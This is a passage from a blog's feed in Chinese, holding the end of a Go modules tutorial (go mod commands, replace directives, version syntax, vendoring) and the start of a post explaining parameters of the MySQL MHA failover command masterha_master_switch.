&#x6587;&#x4EF6;&#x3002;&#x6EE1;&#x8DB3;&#x4EFB;&#x4E00;&#x6761;&#x4EF6;&#x65F6;&#x624D;&#x4F7F;&#x7528; module-aware mode:<ul><li>&#x5F53;&#x524D;&#x76EE;&#x5F55;&#x4F4D;&#x4E8E; GOPATH/src &#x4E4B;&#x5916;&#x5E76;&#x4E14;&#x5305;&#x542B; go.mod &#x6587;&#x4EF6;</li><li>&#x5F53;&#x524D;&#x76EE;&#x5F55;&#x4F4D;&#x4E8E;&#x5305;&#x542B; go.mod &#x6587;&#x4EF6;&#x7684;&#x76EE;&#x5F55;&#x4E0B;    </li></ul></li></ul><p><code>go mod</code> &#x547D;&#x4EE4;<br></p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">download    download modules to local cache (&#x4E0B;&#x8F7D;&#x4F9D;&#x8D56;&#x7684; modules &#x5230;&#x672C;&#x5730; cache)</span><br><span class="line">edit        edit <span class="keyword">go</span>.mod from tools or scripts (&#x7F16;&#x8F91; <span class="keyword">go</span>.mod &#x6587;&#x4EF6;)</span><br><span class="line">graph       <span class="built_in">print</span> module requirement graph (&#x6253;&#x5370;&#x6A21;&#x5757;&#x4F9D;&#x8D56;&#x56FE;)</span><br><span class="line">init        initialize <span class="built_in">new</span> module in current directory (&#x518D;&#x5F53;&#x524D;&#x6587;&#x4EF6;&#x5939;&#x4E0B;&#x521D;&#x59CB;&#x5316;&#x4E00;&#x4E2A;&#x65B0;&#x7684; module, &#x521B;&#x5EFA; <span class="keyword">go</span>.mod &#x6587;&#x4EF6;)</span><br><span class="line">tidy        add missing and remove unused modules (&#x589E;&#x52A0;&#x4E22;&#x5931;&#x7684; modules&#xFF0C;&#x53BB;&#x6389;&#x672A;&#x7528;&#x7684; modules)</span><br><span class="line">vendor      <span class="built_in">make</span> vendored <span class="built_in">copy</span> of dependencies (&#x5C06;&#x4F9D;&#x8D56;&#x590D;&#x5236;&#x5230; vendor &#x4E0B;)</span><br><span class="line">verify      verify dependencies have expected content (&#x6821;&#x9A8C;&#x4F9D;&#x8D56;)</span><br><span class="line">why         explain why packages or modules are needed (&#x89E3;&#x91CA;&#x4E3A;&#x4EC0;&#x4E48;&#x9700;&#x8981;&#x4F9D;&#x8D56;)</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x770B;&#x8FD9;&#x4E9B;&#x547D;&#x4EE4;&#x7684;&#x5E2E;&#x52A9;&#x5DF2;&#x7ECF;&#x6BD4;&#x8F83;&#x5BB9;&#x6613;&#x4E86;&#x89E3;&#x547D;&#x4EE4;&#x7684;&#x529F;&#x80FD;&#x3002;</p><h4 id="&#x65E2;&#x6709;&#x9879;&#x76EE;"><a href="#&#x65E2;&#x6709;&#x9879;&#x76EE;" class="headerlink" title="&#x65E2;&#x6709;&#x9879;&#x76EE;"></a>&#x65E2;&#x6709;&#x9879;&#x76EE;</h4><p>&#x5047;&#x8BBE;&#x4F60;&#x5DF2;&#x7ECF;&#x6709;&#x4E86;&#x4E00;&#x4E2A; go &#x9879;&#x76EE;&#xFF0C; &#x6BD4;&#x5982;&#x5728;<code>$GOPATH/github.com/wangjiemim/mytest</code>&#x4E0B;&#xFF0C; &#x4F60;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;<code>go mod init github.com/wangjiemim/mytest</code>&#x5728;&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#x5939;&#x4E0B;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x7A7A;&#x7684; go.mod (&#x53EA;&#x6709;&#x7B2C;&#x4E00;&#x884C; <code>module github.com/wangjiemim/mytest</code>)&#x3002;</p><p>&#x7136;&#x540E;&#x4F60;&#x53EF;&#x4EE5;&#x901A;&#x8FC7; <code>go get ./...</code>&#x8BA9;&#x5B83;&#x67E5;&#x627E;&#x4F9D;&#x8D56;&#xFF0C;&#x5E76;&#x8BB0;&#x5F55;&#x5728; go.mod &#x6587;&#x4EF6;&#x4E2D; (&#x4F60;&#x8FD8;&#x53EF;&#x4EE5;&#x6307;&#x5B9A; <code>-tags</code>, &#x8FD9;&#x6837;&#x53EF;&#x4EE5;&#x628A; tags &#x7684;&#x4F9D;&#x8D56;&#x90FD;&#x67E5;&#x627E;&#x5230;)&#x3002;</p><p>&#x901A;&#x8FC7;<code>go mod tidy</code>&#x4E5F;&#x53EF;&#x4EE5;&#x7528;&#x6765;&#x4E3A; go.mod &#x589E;&#x52A0;&#x4E22;&#x5931;&#x7684;&#x4F9D;&#x8D56;&#xFF0C;&#x5220;&#x9664;&#x4E0D;&#x9700;&#x8981;&#x7684;&#x4F9D;&#x8D56;&#xFF0C;&#x4F46;&#x662F;&#x6211;&#x4E0D;&#x786E;&#x5B9A;&#x5B83;&#x600E;&#x4E48;&#x5904;&#x7406;<code>tags</code>&#x3002;</p><p>&#x6267;&#x884C;&#x4E0A;&#x9762;&#x7684;&#x547D;&#x4EE4;&#x4F1A;&#x628A; go.mod &#x7684;<code>latest</code>&#x7248;&#x672C;&#x6362;&#x6210;&#x5B9E;&#x9645;&#x7684;&#x6700;&#x65B0;&#x7684;&#x7248;&#x672C;&#xFF0C;&#x5E76;&#x4E14;&#x4F1A;&#x751F;&#x6210;&#x4E00;&#x4E2A;go.sum&#x8BB0;&#x5F55;&#x6BCF;&#x4E2A;&#x4F9D;&#x8D56;&#x5E93;&#x7684;&#x7248;&#x672C;&#x548C;&#x54C8;&#x5E0C;&#x503C;&#x3002;</p><h4 id="replace"><a href="#replace" class="headerlink" title="replace"></a>replace</h4><p>&#x5728;&#x56FD;&#x5185;&#x8BBF;&#x95EE;<code>golang.org/x</code>&#x7684;&#x5404;&#x4E2A;&#x5305;&#x90FD;&#x9700;&#x8981;&#x68AF;&#x5B50;&#xFF0C;&#x4F60;&#x53EF;&#x4EE5;&#x5728; go.mod &#x4E2D;&#x4F7F;&#x7528;<code>replace</code>&#x66FF;&#x6362;&#x6210; github &#x4E0A;&#x5BF9;&#x5E94;&#x7684;&#x5E93;&#x3002;<br></p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">replace (</span><br><span class="line">  golang.org/x/crypto v0<span class="number">.0</span><span class="number">.0</span><span class="number">-20180820150726</span><span class="number">-614d</span>502a4dac =&gt; github.com/golang/crypto v0<span class="number">.0</span><span class="number">.0</span><span class="number">-20180820150726</span><span class="number">-614d</span>502a4dac</span><br><span class="line">  golang.org/x/net v0<span class="number">.0</span><span class="number">.0</span><span class="number">-20180821023952</span><span class="number">-922f</span>4815f713 =&gt; github.com/golang/net v0<span class="number">.0</span><span class="number">.0</span><span class="number">-20180826012351</span><span class="number">-8</span>a410e7b638d</span><br><span class="line">  golang.org/x/text v0<span class="number">.3</span><span class="number">.0</span> =&gt; github.com/golang/text v0<span class="number">.3</span><span class="number">.0</span></span><br><span class="line">)</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4F9D;&#x8D56;&#x5E93;&#x4E2D;&#x7684;<code>replac</code>e&#x5BF9;&#x4F60;&#x7684;&#x4E3B; go.mod &#x4E0D;&#x8D77;&#x4F5C;&#x7528;&#xFF0C;&#x6BD4;&#x5982;<code>github.com/wangjiemin/mytest</code>&#x7684; go.mod &#x5DF2;&#x7ECF;&#x589E;&#x52A0;&#x4E86;<code>replace</code>, &#x4F46;&#x662F;&#x4F60;&#x7684; go.mod &#x867D;&#x7136;<code>require</code>&#x4E86;<code>rpcx</code>&#x7684;&#x5E93;&#xFF0C;&#x4F46;&#x662F;&#x6CA1;&#x6709;&#x8BBE;&#x7F6E;<code>replace</code>&#x7684;&#x8BDD;&#xFF0C; <code>go get</code>&#x8FD8;&#x662F;&#x4F1A;&#x8BBF;&#x95EE;<code>golang.org/x</code>&#x3002;</p><p>&#x6240;&#x4EE5;&#x5982;&#x679C;&#x60F3;&#x7F16;&#x8BD1;&#x90A3;&#x4E2A;&#x9879;&#x76EE;&#xFF0C;&#x5C31;&#x5728;&#x54EA;&#x4E2A;&#x9879;&#x76EE;&#x4E2D;&#x589E;&#x52A0;<code>replace</code>&#x3002;</p><h4 id="&#x5305;&#x7684;&#x7248;&#x672C;&#x63A7;&#x5236;"><a href="#&#x5305;&#x7684;&#x7248;&#x672C;&#x63A7;&#x5236;" class="headerlink" title="&#x5305;&#x7684;&#x7248;&#x672C;&#x63A7;&#x5236;"></a>&#x5305;&#x7684;&#x7248;&#x672C;&#x63A7;&#x5236;</h4><p>&#x4E0B;&#x9762;&#x7684;&#x7248;&#x672C;&#x90FD;&#x662F;&#x5408;&#x6CD5;&#x7684;&#xFF1A;<br></p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gopkg.in/tomb.v1 v1<span class="number">.0</span><span class="number">.0</span><span class="number">-20141024135613</span>-dd632973f1e7</span><br><span class="line">gopkg.in/vmihailenco/msgpack.v2 v2<span class="number">.9</span><span class="number">.1</span></span><br><span class="line">gopkg.in/yaml.v2 &lt;=v2<span class="number">.2</span><span class="number">.1</span></span><br><span class="line">github.com/tatsushid/<span class="keyword">go</span>-fastping v0<span class="number">.0</span><span class="number">.0</span><span class="number">-20160109021039</span>-d7bb493dee3e</span><br><span class="line">latest</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x7248;&#x672C;&#x53F7;&#x9075;&#x5FAA;&#x5982;&#x4E0B;&#x89C4;&#x5F8B;&#xFF1A;<br></p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vX.Y.Z-pre<span class="number">.0</span>.yyyymmddhhmmss-abcdefabcdef</span><br><span class="line">vX<span class="number">.0</span><span class="number">.0</span>-yyyymmddhhmmss-abcdefabcdef</span><br><span class="line">vX.Y.(Z+<span class="number">1</span>)<span class="number">-0.</span>yyyymmddhhmmss-abcdefabcdef</span><br><span class="line">vX.Y.Z</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4E5F;&#x5C31;&#x662F;&#x7248;&#x672C;&#x53F7; + &#x65F6;&#x95F4;&#x6233; + hash&#xFF0C;&#x6211;&#x4EEC;&#x81EA;&#x5DF1;&#x6307;&#x5B9A;&#x7248;&#x672C;&#x65F6;&#x53EA;&#x9700;&#x8981;&#x5236;&#x5B9A;&#x7248;&#x672C;&#x53F7;&#x5373;&#x53EF;&#xFF0C;&#x6CA1;&#x6709;&#x7248;&#x672C; tag &#x7684;&#x5219;&#x9700;&#x8981;&#x627E;&#x5230;&#x5BF9;&#x5E94; commit &#x7684;&#x65F6;&#x95F4;&#x548C; hash &#x503C;&#x3002;</p><p>&#x53E6;&#x5916;&#x7248;&#x672C;&#x53F7;&#x662F;&#x652F;&#x6301; query &#x8868;&#x8FBE;&#x5F0F;&#x7684;&#xFF0C;&#x5176;&#x6C42;&#x503C;&#x7B97;&#x6CD5;&#x662F; &#x201C;&#x9009;&#x62E9;&#x6700;&#x63A5;&#x8FD1;&#x4E8E;&#x6BD4;&#x8F83;&#x76EE;&#x6807;&#x7684;&#x7248;&#x672C; (tagged version)&#x201D;&#xFF0C;&#x5373;&#x4E0A;&#x6587;&#x4E2D;&#x7684; gopkg.in/yaml.v2 &#x4F1A;&#x627E;&#x4E0D;&#x9AD8;&#x4E8E; v2.2.1 &#x7684;&#x6700;&#x9AD8;&#x7248;&#x672C;&#x3002;</p><p>&#x5BF9;&#x4E8E;&#x590D;&#x6742;&#x7684;&#x5305;&#x4F9D;&#x8D56;&#x573A;&#x666F;&#xFF0C;&#x53EF;&#x4EE5;&#x53C2;&#x8003; Russ Cox &#x5728; <a href="https://research.swtch.com/vgo-mvs" target="_blank" rel="noopener">&#x201C;Minimal Version Selection&#x201D;</a> &#x4E00;&#x6587;&#x4E2D;&#x7ED9;&#x51FA;&#x7684;&#x5F62;&#x8C61;&#x7684;&#x7B97;&#x6CD5;&#x89E3;&#x91CA; (&#x6CE8;&#x610F;&#xFF1A;&#x8FD9;&#x4E2A;&#x7B97;&#x6CD5;&#x4EC5;&#x662F;&#x4FBF;&#x4E8E;&#x4EBA;&#x7C7B;&#x7406;&#x89E3;&#xFF0C;&#x4F46;&#x662F;&#x6027;&#x80FD;&#x4F4E;&#x4E0B;&#xFF0C;&#x771F;&#x6B63;&#x7684;&#x5B9E;&#x73B0;&#x5E76;&#x975E;&#x6309;&#x7167;&#x8FD9;&#x4E2A;&#x7B97;&#x6CD5;&#x5B9E;&#x73B0;)&#x3002;</p><h4 id="go-get-&#x5347;&#x7EA7;"><a href="#go-get-&#x5347;&#x7EA7;" class="headerlink" title="go get &#x5347;&#x7EA7;"></a>go get &#x5347;&#x7EA7;</h4><ul><li>&#x8FD0;&#x884C; <code>go get -u</code> &#x5C06;&#x4F1A;&#x5347;&#x7EA7;&#x5230;&#x6700;&#x65B0;&#x7684;&#x6B21;&#x8981;&#x7248;&#x672C;&#x6216;&#x8005;&#x4FEE;&#x8BA2;&#x7248;&#x672C; (x.y.z&#xFF0C;z &#x662F;&#x4FEE;&#x8BA2;&#x7248;&#x672C;&#x53F7;&#xFF0C; y &#x662F;&#x6B21;&#x8981;&#x7248;&#x672C;&#x53F7;)</li><li>&#x8FD0;&#x884C; <code>go get -u=patch</code> &#x5C06;&#x4F1A;&#x5347;&#x7EA7;&#x5230;&#x6700;&#x65B0;&#x7684;&#x4FEE;&#x8BA2;&#x7248;&#x672C;</li><li>&#x8FD0;&#x884C; <code>go get package@version</code> &#x5C06;&#x4F1A;&#x5347;&#x7EA7;&#x5230;&#x6307;&#x5B9A;&#x7684;&#x7248;&#x672C;&#x53F7;<code>version</code></li></ul><h4 id="go-modules-&#x4E0E;-vendor"><a href="#go-modules-&#x4E0E;-vendor" class="headerlink" title="go modules &#x4E0E; vendor"></a>go modules &#x4E0E; vendor</h4><p>&#x5728;&#x6700;&#x521D;&#x7684;&#x8BBE;&#x8BA1;&#x4E2D;&#xFF0C;Russ Cox &#x662F;&#x60F3;&#x5F7B;&#x5E95;&#x5E9F;&#x9664;&#x6389; vendor &#x7684;&#xFF0C;&#x4F46;&#x5728;&#x793E;&#x533A;&#x7684;&#x53CD;&#x9988;&#x4E0B;&#xFF0C;vendor &#x5F97;&#x4EE5;&#x4FDD;&#x7559;&#xFF0C;&#x8FD9;&#x4E5F;&#x662F;&#x4E3A;&#x4E86;&#x517C;&#x5BB9; Go 1.11 &#x4E4B;&#x524D;&#x7684;&#x7248;&#x672C;&#x3002;</p><p>Go modules &#x652F;&#x6301;&#x901A;&#x8FC7;<code>go mod vendor</code>&#x547D;&#x4EE4;&#x5C06;&#x67D0;&#x4E2A; module &#x7684;&#x6240;&#x6709;&#x4F9D;&#x8D56;&#x4FDD;&#x5B58;&#x4E00;&#x4EFD; copy &#x5230; root module dir &#x7684; vendor &#x4E0B;&#xFF0C;&#x7136;&#x540E;&#x5728;&#x6784;&#x5EFA;&#x7684;&#x4F7F;&#x7528;<code>go build -mod=vendor</code>&#x5373;&#x53EF;&#x5FFD;&#x7565; cache &#x91CC;&#x7684;&#x5305;&#x800C;&#x53EA;&#x4F7F;&#x7528; vendor &#x76EE;&#x5F55;&#x91CC;&#x7684;&#x7248;&#x672C;&#x3002;</p><h2 id="&#x53C2;&#x8003;"><a href="#&#x53C2;&#x8003;" class="headerlink" title="&#x53C2;&#x8003;"></a>&#x53C2;&#x8003;</h2><ul><li><a href="https://semver.org/lang/zh-CN/" target="_blank" rel="noopener">&#x8BED;&#x4E49;&#x5316;&#x7248;&#x672C; 2.0.0 | Semantic Versioning</a></li><li><a href="https://golang.google.cn/cmd/go/#hdr-Module_maintenance" target="_blank" rel="noopener">go - The Go Programming Language</a></li><li><a href="https://github.com/golang/go/wiki/Modules" target="_blank" rel="noopener">Modules &#xB7; golang/go Wiki &#xB7; GitHub</a></li><li><a href="https://roberto.selbach.ca/intro-to-go-modules/" target="_blank" rel="noopener">Introduction to Go Modules &#x2013; Roberto Selbach</a></li><li><a href="https://tonybai.com/2018/07/15/hello-go-module/" target="_blank" rel="noopener">&#x521D;&#x7AA5; Go module | Tony Bai</a></li><li><a href="https://www.lightblue.asia/golang-1-11-new-festures-modules/" target="_blank" rel="noopener">Golang 1.11 &#x65B0;&#x529F;&#x80FD;&#x4ECB;&#x7D39; - Modules - LightBlue Essay</a></li><li><a href="https://gocn.vip/article/957" target="_blank" rel="noopener">Golang modules &#x521D;&#x63A2; - Go &#x4E2D;&#x56FD;&#x6280;&#x672F;&#x793E;&#x533A; - golang</a></li><li><a href="https://colobu.com/2018/08/27/learn-go-module/" target="_blank" rel="noopener">&#x8DF3;&#x51FA; Go module &#x7684;&#x6CE5;&#x6F6D; | &#x9E1F;&#x7A9D;</a></li><li><a href="https://windmt.com/2018/11/08/first-look-go-modules/" target="_blank" rel="noopener">Go &#x5305;&#x7BA1;&#x7406;&#x89E3;&#x51B3;&#x4E4B;&#x9053; &#x2014;&#x2014; Modules &#x521D;&#x8BD5;</a></li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;&amp;#x524D;&amp;#x8A00;&quot;&gt;&lt;a href=&quot;#&amp;#x524D;&amp;#x8A00;&quot; class=&quot;headerlink&quot; title=&quot;&amp;#x524D;&amp;#x8A00;&quot;&gt;&lt;/a&gt;&amp;#x524D;&amp;#x8A00;&lt;/h2&gt;&lt;p&gt;Go &amp;#x7684;&amp;#x
      
    
    </summary>
    
      <category term="Golang" scheme="https://jiemin.wang/categories/Golang/"/>
    
    
      <category term="Golang" scheme="https://jiemin.wang/tags/Golang/"/>
    
  </entry>
  
  <entry>
    <title>masterha-master-switch 参数详解</title>
    <link href="https://jiemin.wang/2019/03/28/masterha-master-switch/"/>
    <id>https://jiemin.wang/2019/03/28/masterha-master-switch/</id>
    <published>2019-03-28T11:45:02.000Z</published>
    <updated>2019-03-28T11:52:40.322Z</updated>
    
    <content type="html"><![CDATA[<h4 id="MHA-&#x547D;&#x4EE4;-masterha-master-switch"><a href="#MHA-&#x547D;&#x4EE4;-masterha-master-switch" class="headerlink" title="MHA &#x547D;&#x4EE4; masterha_master_switch"></a>MHA &#x547D;&#x4EE4; <a href="https://github.com/yoshinorim/mha4mysql-manager/wiki/masterha_master_switch" target="_blank" rel="noopener">masterha_master_switch</a></h4><p>&#x5E38;&#x7528;&#x53C2;&#x6570;&#x4ECB;&#x7ECD;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">--master_state=dead</span><br><span class="line">    &#x5F3A;&#x5236;&#x7684;&#x53C2;&#x6570;&#xFF0C;&#x53C2;&#x6570;&#x503C;&#x4E3A;<span class="string">&quot;dead&quot;</span> &#x6216;&#x8005; <span class="string">&quot;alive&quot;</span> . &#x5982;&#x679C; &#x8BBE;&#x7F6E;&#x4E3A; alive &#x6A21;&#x5F0F;&#xFF0C;masterha_master_switch &#x5F00;&#x59CB;&#x5728;&#x7EBF;&#x4E3B;&#x5E93;&#x5207;&#x6362;&#x64CD;&#x4F5C;&#x3002;</span><br><span class="line"> </span><br><span class="line">--dead_master_host=(hostname)</span><br><span class="line">    &#x5F3A;&#x5236;&#x53C2;&#x6570;&#xFF0C;&#x5B95;&#x673A;&#x7684;&#x4E3B;&#x5E93;&#x6240;&#x5728;&#x7684;&#x4E3B;&#x673A;&#x540D;&#x79F0;&#x3002;--dead_master_ip &#x548C; --dead_master_port &#x662F;&#x53EF;&#x9009;&#x53C2;&#x6570;&#xFF0C;&#x5982;&#x679C;&#x8FD9;&#x4E9B;&#x53C2;&#x6570;&#x6CA1;&#x6709;&#x8BBE;&#x7F6E;&#xFF0C;--dead_master_ip &#x5C31;&#x662F; --dead_master_host &#x89E3;&#x6790;&#x7684;IP&#x5730;&#x5740;&#x3002;--dead_master_port &#x4E3A; 3306</span><br><span class="line"> </span><br><span class="line">--new_master_host=(hostname)</span><br><span class="line">    &#x65B0;&#x4E3B;&#x673A;&#x5730;&#x5740;&#xFF0C;&#x53EF;&#x9009;&#x53C2;&#x6570;&#xFF0C;&#x8FD9;&#x4E2A;&#x53C2;&#x6570;&#x5728;&#x4F60;&#x660E;&#x786E;&#x65B0;&#x7684;&#x4E3B;&#x5E93;&#x7684;&#x4E3B;&#x673A;&#xFF0C;&#x975E;&#x5E38;&#x6709;&#x7528;&#x3002;(&#x8FD9;&#x5C31;&#x610F;&#x5473;&#x7740;&#x4F60;&#x4E0D;&#x9700;&#x8981;&#x8BA9;MHA&#x6765;&#x51B3;&#x5B9A;&#x65B0;&#x7684;&#x4E3B;&#x5E93;)&#x3002;&#x5982;&#x679C;&#x4E0D;&#x8BBE;&#x7F6E;&#x6B64;&#x53C2;&#x6570;&#xFF0C;MHA &#x5C06;&#x4F1A;&#x5229;&#x7528;&#x81EA;&#x52A8;failover&#x7684;&#x89C4;&#x5219;&#x6765;&#x9009;&#x62E9;&#x65B0;&#x7684;&#x4E3B;&#x5E93;&#x3002;&#x5982;&#x679C;&#x8BBE;&#x7F6E;--new_master_host&#xFF0C;MHA&#x9009;&#x62E9;&#x6B64;&#x4E3B;&#x673A;&#x4E3A;&#x65B0;&#x7684;&#x4E3B;&#x5E93;&#xFF0C;&#x5982;&#x679C;&#x4E0D;&#x80FD;&#x6210;&#x4E3A;&#x4E3B;&#x5E93;&#xFF0C;MHA&#x5C06;&#x4F1A;&#x9000;&#x51FA;</span><br><span class="line"> </span><br><span class="line">--interactive=(0|1)</span><br><span class="line">    &#x5982;&#x679C;&#x8BBE;&#x7F6E;&#x4E3A;0&#xFF0C;&#x5728;masterha_master_switch&#xFF0C;&#x5B83;&#x81EA;&#x52A8;&#x6267;&#x884C;&#x6545;&#x969C;&#x8F6C;&#x79FB;(&#x975E;&#x4EA4;&#x4E92;&#x5F0F;)&#x3002;&#x8FD9;&#x5B9E;&#x9645;&#x4E0A;&#x662F;&#x548C;masterha_manager&#x7684;&#x5185;&#x90E8;&#x8FD0;&#x884C;&#x673A;&#x5236;&#x4E00;&#x6837;&#xFF0C;&#x8FD9;&#x79CD;&#x975E;&#x4EA4;&#x4E92;&#x5F0F;&#x6545;&#x969C;&#x8F6C;&#x79FB;&#x662F;&#x6709;&#x7528;&#x7684;&#xFF0C;&#x5982;&#x679C;&#x4F60;&#x5DF2;&#x7ECF;&#x8BC1;&#x5B9E;&#x4E86;master&#x6B7B;&#x4E86;,&#x4F46;&#x4F60;&#x60F3;&#x5C3D;&#x5FEB;&#x505A;&#x6545;&#x969C;&#x8F6C;&#x79FB;&#x3002;&#x975E;&#x4EA4;&#x4E92;&#x5F0F;&#x6545;&#x969C;&#x8F6C;&#x79FB;&#x4E5F;&#x662F;&#x6709;&#x7528;&#x7684;,&#x5982;&#x679C;&#x4F60;&#x4F7F;&#x7528;&#x5176;&#x4ED6;&#x73B0;&#x6709;&#x7684;&#x4E3B;&#x76D1;&#x63A7;&#x8F6F;&#x4EF6;&#x548C;&#x8981;&#x8C03;&#x7528;&#x7684;&#x975E;&#x4EA4;&#x4E92;&#x5F0F;&#x6545;&#x969C;&#x8F6C;&#x79FB;&#x547D;&#x4EE4;&#x8F6F;&#x4EF6;&#x3002;&#x5178;&#x578B;&#x7684;&#x4F8B;&#x5B50;&#x662F;masterha_master_switch&#x8C03;&#x7528;&#x4ECE;&#x96C6;&#x7FA4;&#x8F6F;&#x4EF6;&#x50CF;&#x8D77;&#x640F;&#x5668;&#x3002;</span><br><span class="line"> </span><br><span class="line">--ssh_reachable=(0|1|2)</span><br><span class="line">    &#x6307;&#x5B9A;master &#x7ECF;&#x8FC7;SSH&#x662F;&#x5426;&#x53EF;&#x8FBE;&#x3002;0:&#x4E0D;&#x53EF;&#x8FBE;&#x3001;1:&#x53EF;&#x8FBE;&#x3001;2:&#x672A;&#x77E5;(&#x9ED8;&#x8BA4;&#x503C;)&#x3002; &#x5982;&#x679C;&#x8BBE;&#x7F6E;&#x4E3A;&#x4E86;2&#xFF0C;&#x6B64;&#x547D;&#x4EE4;&#x5185;&#x90E8;&#x5C06;&#x4F1A;&#x68C0;&#x6D4B;&#x901A;&#x8FC7;SSH &#x662F;&#x5426;&#x53EF;&#x8FBE;master&#xFF0C;&#x5E76;&#x4E14;&#x8DDF;&#x65B0;SSH &#x72B6;&#x6001;&#x3002;&#x5982;&#x679C;&#x53EF;&#x8FBE;&#xFF0C;&#x4E14;&#x8BBE;&#x7F6E;master_ip_failover_script &#x6216;&#x8005; shutdown_script .&#x5C06;&#x4F1A;&#x6267;&#x884C;<span class="string">&quot;--command=stopssh&quot;</span>&#x3002;&#x5426;&#x5219;&#xFF0C;&#x6267;&#x884C; <span class="string">&quot;--command=stop&quot;</span>&#x3002;&#x53E6;&#x5916;&#xFF0C;&#x5982;&#x679C;&#x5B95;&#x673A;&#x7684;master&#x901A;&#x8FC7;SSH&#x53EF;&#x8FBE;&#xFF0C;failover&#x811A;&#x672C;&#x8BD5;&#x56FE;&#x4ECE;&#x5B95;&#x673A;&#x7684;master&#x673A;&#x5668;&#x4E0A;&#x62F7;&#x8D1D;&#x6CA1;&#x6709;&#x6CA1;&#x6709;&#x53D1;&#x9001;&#x7684;binlog&#x3002;</span><br><span class="line"> </span><br><span class="line">--skip_change_master</span><br><span class="line">    &#x5982;&#x679C;&#x8BBE;&#x7F6E;&#x6B64;&#x53C2;&#x6570;&#xFF0C;&#x5F53;&#x53D1;&#x751F;failover&#x7684;&#x65F6;&#x5019;&#xFF0C;MAH &#x5728;&#x5E94;&#x7528;&#x5B8C;&#x4E0D;&#x540C;&#x7684;relay <span class="built_in">log</span>&#x9000;&#x51FA;&#xFF0C;&#x5FFD;&#x7565;CHANGE MASTER &#x548C; START SLAVE &#x64CD;&#x4F5C;&#x3002;&#x6240;&#x4EE5; slaves &#x4E0D;&#x4F1A;&#x6307;&#x5411; &#x65B0;&#x7684;master. &#x5F00;&#x542F;&#x6B64;&#x53C2;&#x6570;&#xFF0C;&#x6709;&#x5229;&#x4E8E;&#x624B;&#x52A8;&#x7684;&#x4E8C;&#x6B21;&#x68C0;&#x67E5;slave &#x6062;&#x590D;&#x662F;&#x5426;&#x6210;&#x529F;</span><br><span class="line"> </span><br><span class="line">--skip_disable_read_only</span><br><span class="line">    &#x8BBE;&#x7F6E;&#x6B64;&#x53C2;&#x6570;&#xFF0C;MHA &#x5C06;&#x4E0D;&#x4F1A;&#x5728;&#x65B0;&#x7684;&#x4E3B;&#x5E93;&#x4E0A;&#x6267;&#x884C; SET GLOBAL read_only =0 &#x64CD;&#x4F5C;&#xFF0C;&#x6709;&#x5229;&#x4E8E;&#x624B;&#x52A8;&#x64CD;&#x4F5C;</span><br><span class="line"> </span><br><span class="line">--last_failover_minute=(minutes)</span><br><span class="line">    &#x53C2;&#x8003;master_manager </span><br><span class="line"> </span><br><span class="line">--ignore_last_failover</span><br><span class="line">    &#x53C2;&#x8003;master_manager</span><br><span class="line"> </span><br><span class="line">--wait_on_failover_error=(seconds)</span><br><span class="line">    &#x7C7B;&#x4F3C;&#x4E8E;master_manager, &#x6B64;&#x53C2;&#x6570;&#x53EA;&#x7528;&#x4E8E;&#x81EA;&#x52A8;&#x7684;/&#x975E;&#x4EA4;&#x4E92;&#x5F0F;&#x7684;failover&#x3002;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x8BBE;&#x7F6E;--interval=0&#xFF0C;wait_on_failover_error &#x5C06;&#x4F1A;&#x88AB;&#x5FFD;&#x7565;&#xFF0C;&#x5728;&#x53D1;&#x751F;&#x9519;&#x8BEF;&#x7684;&#x65F6;&#x5019;&#x4E0D;&#x4F1A;sleep&#x3002;</span><br><span class="line"> </span><br><span class="line">--remove_dead_master_conf</span><br><span class="line">    &#x53C2;&#x8003;masterha_manager</span><br><span class="line"> </span><br><span class="line">--wait_until_gtid_in_sync(0|1)</span><br><span class="line">    